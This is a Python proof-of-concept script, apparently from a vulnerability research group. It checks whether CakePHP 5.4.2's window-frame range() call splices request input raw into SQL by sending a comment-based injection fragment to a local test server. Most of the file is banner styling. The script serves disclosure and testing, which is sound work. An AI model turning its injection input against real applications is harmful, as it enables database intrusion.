#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: cakephp-window-sqli (High: 8.1)
#  Vendor: CakePHP (Cake Software Foundation)
#  Versions: CakePHP 5.4.2
#  Impact: WindowExpression range/frame offsets spliced into SQL
#  Requires: app that forwards request data into range()/frame()
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "cakephp-window-sqli"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove CakePHP 5.4.2 WindowExpression::range() splices request strings into SQL."""

import json
import re
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

LABEL = "cakephp-window-sqli"
WITNESS = "CAKEPHP-WINDOW-SQLI-WITNESS"
HOST = "127.0.0.1"
PORT = 19440
PIN_VERSION = "5.4.2"
# Compile-only oracle: fragment must appear raw in RANGE BETWEEN, not bound/quoted.
INJECT_START = f"1) /* {WITNESS} */ --"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def fetch(params: dict[str, str]) -> tuple[int, dict[str, Any], str]:
    query = urllib.parse.urlencode(params)
    url = f"http://{HOST}:{PORT}/?{query}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            raw = resp.read().decode("utf-8", "replace")
            status = resp.status
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", "replace")
        status = exc.code
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        raise RuntimeError(f"http-error {exc}") from exc
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"json-error body={raw[:240]!r}") from exc
    if not isinstance(data, dict):
        raise RuntimeError(f"json-not-object body={raw[:240]!r}")
    return status, data, raw


def sql_of(data: dict[str, Any]) -> str:
    sql = data.get("sql")
    return sql if isinstance(sql, str) else ""


def bindings_of(data: dict[str, Any]) -> dict[str, Any]:
    bindings = data.get("bindings")
    return bindings if isinstance(bindings, dict) else {}


def binding_blob(bindings: dict[str, Any]) -> str:
    parts: list[str] = []
    for key, value in bindings.items():
        parts.append(f"{key}={value!r}")
    return " ".join(parts)


def quoted_in_range(sql: str, fragment: str) -> bool:
    match = re.search(r"RANGE BETWEEN\s+(.+?)\s+PRECEDING", sql, flags=re.I | re.S)
    if not match:
        return False
    offset = match.group(1)
    if fragment not in offset:
        return False
    stripped = offset.strip()
    return (stripped.startswith("'") and stripped.endswith("'")) or (
        stripped.startswith('"') and stripped.endswith('"')
    )


def range_uses_placeholder(sql: str) -> bool:
    return re.search(r"RANGE BETWEEN\s+:[A-Za-z0-9_]+\s+PRECEDING", sql, flags=re.I) is not None


def main() -> int:
    log(f"label={LABEL} url=http://{HOST}:{PORT}/ witness={WITNESS}")

    try:
        ping_status, ping, _ping_raw = fetch({"mode": "ping"})
    except RuntimeError as exc:
        return fail(str(exc))
    version = str(ping.get("version") or "")
    package = str(ping.get("package") or "")
    reference = str(ping.get("reference") or "")
    log(
        f"IOC ping status={ping_status} package={package} version={version} "
        f"reference={reference}"
    )
    if ping_status != 200 or version != PIN_VERSION:
        return fail(f"pin-mismatch version={version!r}")

    try:
        rows_status, rows, _rows_raw = fetch({"mode": "rows", "n": "3"})
    except RuntimeError as exc:
        return fail(str(exc))
    rows_sql = sql_of(rows)
    log(f"IOC rows-status={rows_status} sql={rows_sql!r}")
    if rows_status != 200 or not rows.get("ok"):
        return fail("rows-http-failed")
    if "ROWS BETWEEN 3 PRECEDING" not in rows_sql.upper():
        return fail("rows-not-numeric")
    if "ROWS BETWEEN '3'" in rows_sql or 'ROWS BETWEEN "3"' in rows_sql:
        return fail("rows-quoted")
    if re.search(r"ROWS BETWEEN\s+:[A-Za-z0-9_]+\s+PRECEDING", rows_sql, flags=re.I):
        return fail("rows-bound")

    try:
        range_status, ranged, _range_raw = fetch(
            {"mode": "range", "start": INJECT_START},
        )
    except RuntimeError as exc:
        return fail(str(exc))
    range_sql = sql_of(ranged)
    bindings = bindings_of(ranged)
    log(f"IOC range-status={range_status} sql={range_sql!r}")
    log(f"IOC range-bindings {binding_blob(bindings) or '(none)'}")
    if range_status != 200 or not ranged.get("ok"):
        return fail("range-http-failed")
    if "RANGE BETWEEN" not in range_sql.upper():
        return fail("range-clause-missing")
    if WITNESS not in range_sql:
        return fail("witness-not-in-sql")
    if INJECT_START not in range_sql:
        return fail("inject-fragment-missing")
    if range_uses_placeholder(range_sql):
        return fail("range-bound-placeholder")
    if quoted_in_range(range_sql, INJECT_START) or quoted_in_range(range_sql, WITNESS):
        return fail("range-quoted")
    bound_values = " ".join(str(v) for v in bindings.values())
    if WITNESS in bound_values or INJECT_START in bound_values:
        return fail("witness-bound")

    log(
        "SUCCESS "
        f"{LABEL} pin={PIN_VERSION} range-raw=yes rows-numeric=yes "
        f"bound=no quoted=no {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

